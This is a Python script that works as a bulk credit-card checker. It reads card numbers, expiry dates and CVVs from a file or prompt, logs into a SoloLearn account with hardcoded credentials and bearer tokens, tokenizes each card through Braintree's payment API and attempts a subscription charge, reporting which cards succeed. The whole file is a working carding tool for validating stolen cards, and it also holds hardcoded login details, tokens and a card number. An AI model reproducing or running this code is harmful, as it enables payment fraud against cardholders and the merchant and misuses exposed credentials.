

import requests
from colorama import Fore

ss = requests.Session()

user_input = '5357634974663514|20|30|677'
ccn, mm, yy, cvc = user_input.split('|')









def starting():

 print(Fore.RED+"__________________________________\n"+Fore.RESET)
 print(Fore.YELLOW+"(1) Import From File:> "+Fore.RESET)
 print(Fore.YELLOW+"(2) Single Card Checker:> "+Fore.RESET)
 print(Fore.RED+"__________________________________"+Fore.RESET)
 user_value = int(input("Enter Input: "))
 refreshToken,uid = login()   
 if user_value ==1:
   with open('allcc.txt', 'r') as file:
    for line in file:
        user_input  = line.strip()  # remove trailing newline character
        print(user_input)
        braintree(user_input,refreshToken,uid)
 else:
  user_input = input('Enter Card  : ')
  braintree(user_input,refreshToken,uid)  







def login():
        data = {"email":"fivahoj360@sgatra.com","password":"fivahoj360@sgatra.com","subject":"32cd9aa5f2408d2cbb9a514d684290aa"}

        AUTH_TOKEN = 'eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiJ7XCJJbnN0YW5jZUlkXCI6NDY5MDIzNTEsXCJVc2VySWRcIjowLFwiTmlja25hbWVcIjpudWxsLFwiRGV2aWNlSWRcIjo5MjMxMDkyMixcIkNsaWVudElkXCI6MTE0MyxcIkxvY2FsZUlkXCI6MSxcIkFwcFZlcnNpb25cIjpcIjAuMC4wLjBcIixcIklzUHJvXCI6ZmFsc2UsXCJQbGFuQ29uZmlndXJhdGlvbklkXCI6MyxcIkdlbmVyYXRpb25cIjpcImU1NWQxZjlkLWI2NmItNDVhYy1hMWQ3LWFhMDA5MGM3OGNhY1wifSIsImp0aSI6ImI4NmIzZTY1LTMwMTUtNGE5Yi1hNWVlLTVhMTNhMWRlNjY5YyIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6IlB1YmxpYyIsIm5iZiI6MTcyNzcyMTk5OSwiZXhwIjoxNzI3NzI1NTk5LCJpc3MiOiJTb2xvTGVhcm4uU2VjdXJpdHkuQmVhcmVyIiwiYXVkIjoiU29sb0xlYXJuLlNlY3VyaXR5LkJlYXJlciJ9.J7eYkpjGmUNT4Grw8UFrFCRutTYX4FI_bFiSJ4NMAwbBz0qqo3HsboSYHlSfcGtP6mIURNs1eamHYBYb0dz4eg'

        # Define the HTTP request headers as a dictionary
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": f"Bearer {AUTH_TOKEN}",
            'Content-length':'113',
            "Content-Type": "application/json",
            "Origin": "https://www.sololearn.com",
            "Priority": "u=1, i",
            "Referer": "https://www.sololearn.com/",
            "Sec-CH-UA": "\"Google Chrome\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
            "Sec-CH-UA-Mobile": "?1",
            "Sec-CH-UA-Platform": "\"Android\"",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "SL-Locale": "en",
            "SL-Plan-Id": "",
            "SL-Time-Zone": "+5.5",
            "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36"
        }


        res = ss.post('https://api2.sololearn.com/v2/authentication/user:login',json=data,headers=headers)

        print('_______________STEP 1 ____________________')

        print(res.text)


        json_data = res.json()
        uid = json_data['user']['id']
        refreshToken = json_data['refreshToken']

        return refreshToken,uid

################ signup to get cred

def braintree(cc,refreshToken,uid):
        
    ################### CONVERTING THE INFO OF CREDIT CARD INTO SEGAMENTS


        user_input = cc
        ccn, mm, yy, cvc = user_input.split('|')





        ###################     REFRESH TOKEN

        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Length': '760',
            'Content-Type': 'application/json',
            'Origin': 'https://www.sololearn.com',
            'Priority': 'u=1, i',
            'Referer': 'https://www.sololearn.com/',
            'Sec-CH-UA': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            'Sec-CH-UA-Mobile': '?1',
            'Sec-CH-UA-Platform': 'Android',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36'
        }


        data = f"{refreshToken}"

        response = ss.post('https://api2.sololearn.com/v2/authentication/token:refresh',headers=headers,json=data)
        print('_______________STEP 2 ____________________')

        print(response.text)

        jsondata = response.json()

        accessToken = jsondata['accessToken']



        ###############################   CHECKING THE GRAPHQL 


        headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": f"Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mjc3NzEzMTksImp0aSI6IjgyZTFlM2NmLTE2MGItNDczNC1iN2QzLTVkZjc0NTczMTg5OCIsInN1YiI6Ino3N2pyOHZiamIycTN5ZHAiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ino3N2pyOHZiamIycTN5ZHAiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.aX00PKdFfpndfEgUthjJ-oT09F5rkakoTl3nkDcwfAbExbX1zt0BQvliH_x18OjzYlNleUD-jqqNLBShTzrtcg",

            "Braintree-Version": "2018-05-10",
            "Content-Length": "794",
            "Content-Type": "application/json",
            "Origin": "https://assets.braintreegateway.com",
            "Priority": "u=1, i",
            "Referer": "https://assets.braintreegateway.com/",
            "Sec-CH-UA": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "Sec-CH-UA-Mobile": "?1",
            "Sec-CH-UA-Platform": '"Android"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
            "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36"
        }

        data = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": "1a1e6734-0ae3-46a0-a178-c0e98d1361e1"
            },
            "query": """mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                tokenizeCreditCard(input: $input) {
                    token
                    creditCard {
                        bin
                        brandCode
                        last4
                        cardholderName
                        expirationMonth
                        expirationYear
                        binData {
                            prepaid
                            healthcare
                            debit
                            durbinRegulated
                            commercial
                            payroll
                            issuingBank
                            countryOfIssuance
                            productId
                        }
                    }
                }
            }""",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": ccn,
                        "expirationMonth": mm,
                        "expirationYear": yy,
                        "cvv": cvc,
                        "billingAddress": {
                            "postalCode": "94930"
                        }
                    },
                    "options": {
                        "validate": False
                    }
                }
            },
            "operationName": "TokenizeCreditCard"
        }

        try:
            response = ss.post('https://payments.braintree-api.com/graphql',headers=headers,json=data)
            print('_______________STEP 3 ____________________')
            print(response.text)

            json_data = response.json()

            unique_token = json_data['data']['tokenizeCreditCard']['token']

            print(unique_token)
        except Exception as e:
            print('')




        ####################    SENDING THE PAYMENT ID



        data = {
            "nonce": unique_token,
            "method": "card",
            "deviceData": "{\"correlation_id\":\"b9c54f5e-ddbe-468a-8aee-1285c53b\"}",
            "productKey": "ai-annual-trial",
            "userId": 32740189
        }


        headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": f"Bearer {accessToken}",
            "Content-Length": "192",
            "Content-Type": "application/json",
            "Origin": "https://www.sololearn.com",
            "Priority": "u=1, i",
            "Referer": "https://www.sololearn.com/",
            "Sec-CH-UA": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "Sec-CH-UA-Mobile": "?1",
            "Sec-CH-UA-Platform": '"Android"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "SL-Locale": "en",
            "SL-Plan-ID": "2",
            "SL-Time-Zone": "+5.5",
            "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36"
        }


        response = ss.post('https://api2.sololearn.com/v2/payment/api/Payments/subscribe',headers=headers,json=data)
        print('_______________STEP 4 ____________________')

        print(response.text)

        json_data = response.json()


        try:
         if json_data.get("success") == False and json_data.get("errors")[0].get("message") == "Something went wrong. Please make sure your card details are correct":
            print(Fore.RED+"Failed Payment failed >>> Make Sure Your Card Details are Correct"+Fore.RESET)
         elif   json_data.get("success") == True:
            print(Fore.GREEN+"Success"+Fore.RESET) 

        except Exception as e:
                print(response.text)







starting()